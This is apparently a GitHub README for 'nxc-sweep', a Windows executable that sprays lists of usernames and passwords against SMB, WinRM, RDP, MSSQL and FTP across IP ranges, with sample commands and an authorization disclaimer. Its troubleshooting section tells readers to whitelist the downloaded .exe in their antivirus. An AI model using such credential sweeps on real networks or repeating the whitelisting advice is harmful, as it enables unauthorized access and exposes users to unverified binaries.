# 🛡️ nxc-sweep - Validate stolen credentials across your network

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jakovljevi2644/nxc-sweep/releases)

## 🔍 Purpose
The nxc-sweep tool automates the process of checking lists of usernames and passwords against your computers. It targets common network services like SMB, WinRM, RDP, MSSQL, and FTP. Use this tool to see if leaked accounts work on your local network. It saves time by testing many combinations in a single pass. 

## ⚙️ Requirements
Ensure your computer meets these conditions to run nxc-sweep:
* Operating System: Windows 10 or Windows 11.
* Network Access: A stable connection to the devices you want to scan.
* Administrator Rights: Administrative access on the machine running the tool helps avoid permission blocks.
* Disk Space: At least 100 megabytes of free space.
* Memory: 4 gigabytes of RAM or higher for smooth performance.

## 📥 How to download
Visit the [official releases page](https://github.com/jakovljevi2644/nxc-sweep/releases) to access the application. Locate the version listed under the Latest release header. Click the file ending in .exe to start the transfer to your computer. Save this file to a folder you can remember, such as your Downloads folder or a dedicated security folder on your desktop.

## 🚀 Running the software
Open your terminal emulator or command prompt. Navigate to the directory where you saved the file. Execute the program by typing its name followed by the necessary parameters. The application uses a simple structure to guide you through the process. 

1. Open the Start menu.
2. Type Command Prompt in the search bar.
3. Select the Command Prompt app to open the black window.
4. Type `cd` followed by the path to your folder.
5. Press the Enter key.
6. Type the name of the nxc-sweep file to display help instructions.

## 🛠️ Usage instructions
The tool requires a list of files to perform its checks. Prepare a text file containing the usernames and passwords you want to test. Place this text file in the same folder as the nxc-sweep program. 

Run the scan using the standard command line flags. For example, specify your target range using the IP address format. The program outputs the status of each login attempt directly to your screen. Green text indicates a successful match with valid credentials. Red text indicates a failed attempt. 

## 📋 Common commands
Use these snippets to start your work:

* Scan a single target: `nxc-sweep -t 192.168.1.1`
* Scan a range of targets: `nxc-sweep -t 192.168.1.0/24`
* Use a password file: `nxc-sweep -t 192.168.1.5 -p passwords.txt`

## 🛡️ Security best practices
Handle your password files with extreme care. Password text files contain sensitive data. Delete these files from your system immediately after completing your scan. Use these credentials only on systems you own or have explicit permission to test. Unauthorized access to computer networks remains a criminal act in most jurisdictions. 

## 🐛 Troubleshooting
If the program fails to start, verify your network settings. Windows Defender or other antivirus software might flag the tool as suspicious because it performs network scanning. Add an exception for the file folder in your security settings if the application remains blocked. 

Check your network cable or Wi-Fi connection if the tool reports timeout errors. Ensure you have the rights to connect to the target machines. Contact your network administrator if you face persistent connection issues while scanning restricted segments of the network. 

## 📈 Improving results
Increase the concurrency level to speed up the scan if you possess a fast network connection. The tool tests one entry at a time by default. Use the thread flag to scan multiple targets at once. Observe your network traffic while you run the tool. High thread counts generate significant traffic that might crash older devices or trigger automated security alarms on your network. 

## 📄 License
This application uses the MIT License. You have permission to share, modify, and distribute the code for your own work. The creators of the tool accept no liability for damages caused by the use of this software. You carry full responsibility for your actions while operating this tool. 

## 💡 Frequently asked questions
* Does this tool steal my data? No. It only attempts to log in to target machines with the credentials you provide.
* Can I run this on a Mac? This specific version works on Windows. 
* Where do I report bugs? Use the Issues tab on the GitHub repository page to submit error logs or feature requests. 
* Is the tool free? Yes. All files on the repository page remain free to download and use.